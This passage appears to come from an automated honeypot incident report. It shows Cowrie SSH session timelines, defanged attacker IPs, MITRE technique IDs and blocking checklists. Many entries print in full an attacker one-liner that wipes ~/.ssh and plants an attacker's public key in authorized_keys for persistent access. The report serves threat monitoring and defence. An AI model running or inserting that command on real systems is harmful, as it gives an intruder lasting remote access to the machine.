| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:58:42` | `cowrie.session.connect` |
| `2026-06-02 20:58:42` | `cowrie.client.version` |
| `2026-06-02 20:58:42` | `cowrie.client.kex` |
| `2026-06-02 20:58:42` | `cowrie.login.success` |
| `2026-06-02 20:58:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `161.35.65[.]86` to AbuseIPDB if not already reported
- [ ] Block `161.35.65[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-779382c74188

| Field | Detail |
|---|---|
| **Source IP** | `54.37.74[.]179` |
| **First Seen** | 2026-06-02 20:59 |
| **Last Seen** | 2026-06-02 20:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:59:16` | `cowrie.session.connect` |
| `2026-06-02 20:59:16` | `cowrie.client.version` |
| `2026-06-02 20:59:16` | `cowrie.client.kex` |
| `2026-06-02 20:59:17` | `cowrie.login.success` |
| `2026-06-02 20:59:17` | `cowrie.session.params` |
| `2026-06-02 20:59:17` | `cowrie.command.input` |
| `2026-06-02 20:59:17` | `cowrie.command.failed` |
| `2026-06-02 20:59:18` | `cowrie.log.closed` |
| `2026-06-02 20:59:18` | `cowrie.session.params` |
| `2026-06-02 20:59:18` | `cowrie.command.input` |
| `2026-06-02 20:59:18` | `cowrie.session.file_download` |
| `2026-06-02 20:59:18` | `cowrie.log.closed` |
| `2026-06-02 20:59:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.37.74[.]179` to AbuseIPDB if not already reported
- [ ] Block `54.37.74[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f401b0418395

| Field | Detail |
|---|---|
| **Source IP** | `54.37.74[.]179` |
| **First Seen** | 2026-06-02 20:59 |
| **Last Seen** | 2026-06-02 20:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 20:59:20` | `cowrie.session.connect` |
| `2026-06-02 20:59:20` | `cowrie.client.version` |
| `2026-06-02 20:59:20` | `cowrie.client.kex` |
| `2026-06-02 20:59:21` | `cowrie.login.success` |
| `2026-06-02 20:59:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.37.74[.]179` to AbuseIPDB if not already reported
- [ ] Block `54.37.74[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-446ac4bd050f

| Field | Detail |
|---|---|
| **Source IP** | `61.76.136[.]25` |
| **First Seen** | 2026-06-02 21:00 |
| **Last Seen** | 2026-06-02 21:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:00:11` | `cowrie.session.connect` |
| `2026-06-02 21:00:11` | `cowrie.client.version` |
| `2026-06-02 21:00:11` | `cowrie.client.kex` |
| `2026-06-02 21:00:12` | `cowrie.login.success` |
| `2026-06-02 21:00:12` | `cowrie.session.params` |
| `2026-06-02 21:00:12` | `cowrie.command.input` |
| `2026-06-02 21:00:12` | `cowrie.command.failed` |
| `2026-06-02 21:00:12` | `cowrie.log.closed` |
| `2026-06-02 21:00:13` | `cowrie.session.params` |
| `2026-06-02 21:00:13` | `cowrie.command.input` |
| `2026-06-02 21:00:13` | `cowrie.session.file_download` |
| `2026-06-02 21:00:13` | `cowrie.log.closed` |
| `2026-06-02 21:00:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.76.136[.]25` to AbuseIPDB if not already reported
- [ ] Block `61.76.136[.]25` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a21f5423db44

| Field | Detail |
|---|---|
| **Source IP** | `61.76.136[.]25` |
| **First Seen** | 2026-06-02 21:00 |
| **Last Seen** | 2026-06-02 21:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:00:15` | `cowrie.session.connect` |
| `2026-06-02 21:00:15` | `cowrie.client.version` |
| `2026-06-02 21:00:15` | `cowrie.client.kex` |
| `2026-06-02 21:00:15` | `cowrie.login.success` |
| `2026-06-02 21:00:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.76.136[.]25` to AbuseIPDB if not already reported
- [ ] Block `61.76.136[.]25` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cdae8ffb78e

| Field | Detail |
|---|---|
| **Source IP** | `182.253.156[.]184` |
| **First Seen** | 2026-06-02 21:00 |
| **Last Seen** | 2026-06-02 21:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:00:54` | `cowrie.session.connect` |
| `2026-06-02 21:00:54` | `cowrie.client.version` |
| `2026-06-02 21:00:54` | `cowrie.client.kex` |
| `2026-06-02 21:00:54` | `cowrie.login.success` |
| `2026-06-02 21:00:54` | `cowrie.session.params` |
| `2026-06-02 21:00:54` | `cowrie.command.input` |
| `2026-06-02 21:00:54` | `cowrie.command.failed` |
| `2026-06-02 21:00:55` | `cowrie.log.closed` |
| `2026-06-02 21:00:55` | `cowrie.session.params` |
| `2026-06-02 21:00:55` | `cowrie.command.input` |
| `2026-06-02 21:00:55` | `cowrie.session.file_download` |
| `2026-06-02 21:00:55` | `cowrie.log.closed` |
| `2026-06-02 21:00:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.156[.]184` to AbuseIPDB if not already reported
- [ ] Block `182.253.156[.]184` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a80332d73cd

| Field | Detail |
|---|---|
| **Source IP** | `182.253.156[.]184` |
| **First Seen** | 2026-06-02 21:00 |
| **Last Seen** | 2026-06-02 21:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:00:57` | `cowrie.session.connect` |
| `2026-06-02 21:00:57` | `cowrie.client.version` |
| `2026-06-02 21:00:57` | `cowrie.client.kex` |
| `2026-06-02 21:00:57` | `cowrie.login.success` |
| `2026-06-02 21:00:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.156[.]184` to AbuseIPDB if not already reported
- [ ] Block `182.253.156[.]184` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7a8979a6c6d

| Field | Detail |
|---|---|
| **Source IP** | `50.116.72[.]139` |
| **First Seen** | 2026-06-02 21:01 |
| **Last Seen** | 2026-06-02 21:01 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:01:16` | `cowrie.session.connect` |
| `2026-06-02 21:01:16` | `cowrie.client.version` |
| `2026-06-02 21:01:16` | `cowrie.client.kex` |
| `2026-06-02 21:01:17` | `cowrie.login.success` |
| `2026-06-02 21:01:17` | `cowrie.session.params` |
| `2026-06-02 21:01:17` | `cowrie.command.input` |
| `2026-06-02 21:01:17` | `cowrie.command.failed` |
| `2026-06-02 21:01:18` | `cowrie.log.closed` |
| `2026-06-02 21:01:18` | `cowrie.session.params` |
| `2026-06-02 21:01:18` | `cowrie.command.input` |
| `2026-06-02 21:01:18` | `cowrie.session.file_download` |
| `2026-06-02 21:01:18` | `cowrie.log.closed` |
| `2026-06-02 21:01:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.116.72[.]139` to AbuseIPDB if not already reported
- [ ] Block `50.116.72[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c0917944522

| Field | Detail |
|---|---|
| **Source IP** | `50.116.72[.]139` |
| **First Seen** | 2026-06-02 21:01 |
| **Last Seen** | 2026-06-02 21:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:01:21` | `cowrie.session.connect` |
| `2026-06-02 21:01:21` | `cowrie.client.version` |
| `2026-06-02 21:01:22` | `cowrie.client.kex` |
| `2026-06-02 21:01:23` | `cowrie.login.success` |
| `2026-06-02 21:01:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.116.72[.]139` to AbuseIPDB if not already reported
- [ ] Block `50.116.72[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b0591c21d45

| Field | Detail |
|---|---|
| **Source IP** | `50.116.72[.]139` |
| **First Seen** | 2026-06-02 21:02 |
| **Last Seen** | 2026-06-02 21:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:02:43` | `cowrie.session.connect` |
| `2026-06-02 21:02:43` | `cowrie.client.version` |
| `2026-06-02 21:02:43` | `cowrie.client.kex` |
| `2026-06-02 21:02:44` | `cowrie.login.success` |
| `2026-06-02 21:02:45` | `cowrie.session.params` |
| `2026-06-02 21:02:45` | `cowrie.command.input` |
| `2026-06-02 21:02:45` | `cowrie.command.failed` |
| `2026-06-02 21:02:46` | `cowrie.log.closed` |
| `2026-06-02 21:02:46` | `cowrie.session.params` |
| `2026-06-02 21:02:46` | `cowrie.command.input` |
| `2026-06-02 21:02:46` | `cowrie.session.file_download` |
| `2026-06-02 21:02:46` | `cowrie.log.closed` |
| `2026-06-02 21:02:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.116.72[.]139` to AbuseIPDB if not already reported
- [ ] Block `50.116.72[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1306abc79502

| Field | Detail |
|---|---|
| **Source IP** | `50.116.72[.]139` |
| **First Seen** | 2026-06-02 21:02 |
| **Last Seen** | 2026-06-02 21:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:02:49` | `cowrie.session.connect` |
| `2026-06-02 21:02:49` | `cowrie.client.version` |
| `2026-06-02 21:02:49` | `cowrie.client.kex` |
| `2026-06-02 21:02:50` | `cowrie.login.success` |
| `2026-06-02 21:02:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.116.72[.]139` to AbuseIPDB if not already reported
- [ ] Block `50.116.72[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-978fb46e5823

| Field | Detail |
|---|---|
| **Source IP** | `182.253.156[.]184` |
| **First Seen** | 2026-06-02 21:02 |
| **Last Seen** | 2026-06-02 21:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:02:58` | `cowrie.session.connect` |
| `2026-06-02 21:02:58` | `cowrie.client.version` |
| `2026-06-02 21:02:59` | `cowrie.client.kex` |
| `2026-06-02 21:02:59` | `cowrie.login.success` |
| `2026-06-02 21:02:59` | `cowrie.session.params` |
| `2026-06-02 21:02:59` | `cowrie.command.input` |
| `2026-06-02 21:02:59` | `cowrie.command.failed` |
| `2026-06-02 21:02:59` | `cowrie.log.closed` |
| `2026-06-02 21:02:59` | `cowrie.session.params` |
| `2026-06-02 21:02:59` | `cowrie.command.input` |
| `2026-06-02 21:03:00` | `cowrie.session.file_download` |
| `2026-06-02 21:03:00` | `cowrie.log.closed` |
| `2026-06-02 21:03:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.156[.]184` to AbuseIPDB if not already reported
- [ ] Block `182.253.156[.]184` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e41bf8bf2ae

| Field | Detail |
|---|---|
| **Source IP** | `182.253.156[.]184` |
| **First Seen** | 2026-06-02 21:03 |
| **Last Seen** | 2026-06-02 21:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:03:01` | `cowrie.session.connect` |
| `2026-06-02 21:03:01` | `cowrie.client.version` |
| `2026-06-02 21:03:01` | `cowrie.client.kex` |
| `2026-06-02 21:03:02` | `cowrie.login.success` |
| `2026-06-02 21:03:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.156[.]184` to AbuseIPDB if not already reported
- [ ] Block `182.253.156[.]184` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cacc71c272a8

| Field | Detail |
|---|---|
| **Source IP** | `50.116.72[.]139` |
| **First Seen** | 2026-06-02 21:04 |
| **Last Seen** | 2026-06-02 21:04 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:04:13` | `cowrie.session.connect` |
| `2026-06-02 21:04:13` | `cowrie.client.version` |
| `2026-06-02 21:04:13` | `cowrie.client.kex` |
| `2026-06-02 21:04:14` | `cowrie.login.success` |
| `2026-06-02 21:04:15` | `cowrie.session.params` |
| `2026-06-02 21:04:15` | `cowrie.command.input` |
| `2026-06-02 21:04:15` | `cowrie.command.failed` |
| `2026-06-02 21:04:16` | `cowrie.log.closed` |
| `2026-06-02 21:04:16` | `cowrie.session.params` |
| `2026-06-02 21:04:16` | `cowrie.command.input` |
| `2026-06-02 21:04:16` | `cowrie.session.file_download` |
| `2026-06-02 21:04:16` | `cowrie.log.closed` |
| `2026-06-02 21:04:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.116.72[.]139` to AbuseIPDB if not already reported
- [ ] Block `50.116.72[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17408e6f9d17

| Field | Detail |
|---|---|
| **Source IP** | `50.116.72[.]139` |
| **First Seen** | 2026-06-02 21:04 |
| **Last Seen** | 2026-06-02 21:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:04:19` | `cowrie.session.connect` |
| `2026-06-02 21:04:19` | `cowrie.client.version` |
| `2026-06-02 21:04:19` | `cowrie.client.kex` |
| `2026-06-02 21:04:20` | `cowrie.login.success` |
| `2026-06-02 21:04:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.116.72[.]139` to AbuseIPDB if not already reported
- [ ] Block `50.116.72[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe6ab0812428

| Field | Detail |
|---|---|
| **Source IP** | `42.200.66[.]164` |
| **First Seen** | 2026-06-02 21:04 |
| **Last Seen** | 2026-06-02 21:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:04:38` | `cowrie.session.connect` |
| `2026-06-02 21:04:38` | `cowrie.client.version` |
| `2026-06-02 21:04:38` | `cowrie.client.kex` |
| `2026-06-02 21:04:39` | `cowrie.login.success` |
| `2026-06-02 21:04:39` | `cowrie.session.params` |
| `2026-06-02 21:04:39` | `cowrie.command.input` |
| `2026-06-02 21:04:39` | `cowrie.command.failed` |
| `2026-06-02 21:04:40` | `cowrie.log.closed` |
| `2026-06-02 21:04:40` | `cowrie.session.params` |
| `2026-06-02 21:04:40` | `cowrie.command.input` |
| `2026-06-02 21:04:40` | `cowrie.session.file_download` |
| `2026-06-02 21:04:40` | `cowrie.log.closed` |
| `2026-06-02 21:04:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.200.66[.]164` to AbuseIPDB if not already reported
- [ ] Block `42.200.66[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e3be594e29a

| Field | Detail |
|---|---|
| **Source IP** | `42.200.66[.]164` |
| **First Seen** | 2026-06-02 21:04 |
| **Last Seen** | 2026-06-02 21:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 21:04:42` | `cowrie.session.connect` |
| `2026-06-02 21:04:42` | `cowrie.client.version` |
| `2026-06-02 21:04:42` | `cowrie.client.kex` |
| `2026-06-02 21:04:43` | `cowrie.login.success` |
| `2026-06-02 21:04:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.200.66[.]164` to AbuseIPDB if not already reported
- [ ] Block `42.200.66[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-942c6d208ed2

| Field | Detail |
|---|---|
| **Source IP** | `104.208.108[.]166` |
| **First Seen** | 2026-06-02 21:04 |
| **Last Seen** | 2026-06-02 21:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
